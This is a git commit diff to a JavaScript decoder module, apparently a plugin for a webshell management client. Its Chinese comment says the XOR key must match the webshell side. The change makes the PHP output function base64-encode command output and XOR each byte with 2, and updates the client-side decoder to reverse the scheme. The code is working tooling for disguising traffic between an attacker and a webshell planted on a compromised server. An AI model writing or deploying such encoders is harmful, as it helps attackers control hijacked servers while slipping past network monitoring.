646ca4144b49fd1da257b09be28ae3a3282f55eb
Xiaopan233 <xiaopan233@xiaopan233.com>
2020-11-21 23:57:44 +0800

    update

--- php/x1_decoder_php.js
+++ php/x1_decoder_php.js
@@ -12,30 +12,30 @@ module.exports = {
   //$number变量为与流量异或的值 修改后流量会变得不一样。必须配置与Webshell端一致
   asoutput: () => {
     return `function asenc($out){
-      	$number=2;
-      	$res = '';
-      	for ($i=0; $i < strlen($out); $i++) { 
-      		$a = ord($out[$i]);
-      		$res .= ord($out[$i])^$number;
-      		$res .= '/';
-      	}
-      	return rtrim($res,'/'); 
+        $number=2;
+        $res = '';
+        $out = base64_encode($out);
+        for ($i=0; $i < strlen($out); $i++) { 
+          $res .= ord($out[$i])^$number;
+          $res .= '/';
+        }
+        return rtrim($res,'/'); 
     }
     `.replace(/\n\s+/g, '');
   },
   
   decode_buff: (data, ext={}) => {
-    	var number=2;
-	    var res = '';
-	    var s = data.toString()
-	    s = s.split("/")
-	    for(var i in s){
-	      if(i == "unique"){
-	        break
-	      }
-	      var n = s[i]^number
-	      res += String.fromCharCode(n)
-	    }
-    return res;
+      var number=2;
+      var res = '';
+      var s = data.toString()
+      s = s.split("/")
+      for(var i in s){
+        if(i == "unique"){
+          break
+        }
+        var n = s[i]^number
+        res += String.fromCharCode(n)
+      }
+    return atob(res);
   }
 }
